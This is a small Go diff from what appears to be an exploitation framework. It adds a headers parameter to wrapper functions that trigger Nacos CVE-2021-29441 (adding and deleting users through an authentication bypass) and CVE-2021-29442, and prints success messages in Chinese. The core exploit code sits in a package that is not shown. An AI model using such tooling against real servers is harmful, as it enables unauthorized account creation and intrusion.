@@ -27,25 +27,25 @@ func trimRightSubString(url string) string {
 
 // nacos
 
-func (e *Exp) CVE_2021_29441_AddUser(url, username, password string, proxy clients.Proxy) string {
+func (e *Exp) CVE_2021_29441_AddUser(url string, headers map[string]string, username, password string, proxy clients.Proxy) string {
 	url = trimRightSubString(url)
-	if nacos.CVE_2021_29441_Step1(url, username, password, clients.NewHttpClientWithProxy(nil, true, proxy)) {
+	if nacos.CVE_2021_29441_Step1(url, headers, username, password, clients.NewHttpClientWithProxy(nil, true, proxy)) {
 		return fmt.Sprintf("[+] 添加用户成功: \nusername: %s\npassword: %s", username, password)
 	}
 	return "[-] 添加用户失败"
 }
 
-func (e *Exp) CVE_2021_29441_DelUser(url, username string, proxy clients.Proxy) string {
+func (e *Exp) CVE_2021_29441_DelUser(url string, headers map[string]string, username string, proxy clients.Proxy) string {
 	url = trimRightSubString(url)
-	if nacos.CVE_2021_29441_Step2(url, username, clients.NewHttpClientWithProxy(nil, true, proxy)) {
+	if nacos.CVE_2021_29441_Step2(url, headers, username, clients.NewHttpClientWithProxy(nil, true, proxy)) {
 		return fmt.Sprintf("[+] 删除用户成功: \nusername: %s", username)
 	}
 	return "[-] 删除用户失败"
 }
 
-func (e *Exp) CVE_2021_29442(url string, proxy clients.Proxy) string {
+func (e *Exp) CVE_2021_29442(url string, headers map[string]string, proxy clients.Proxy) string {
 	url = trimRightSubString(url)
-	return nacos.CVE_2021_29442(url, clients.NewHttpClientWithProxy(nil, true, proxy))
+	return nacos.CVE_2021_29442(url, headers, clients.NewHttpClientWithProxy(nil, true, proxy))
 }
 
 // hikvision
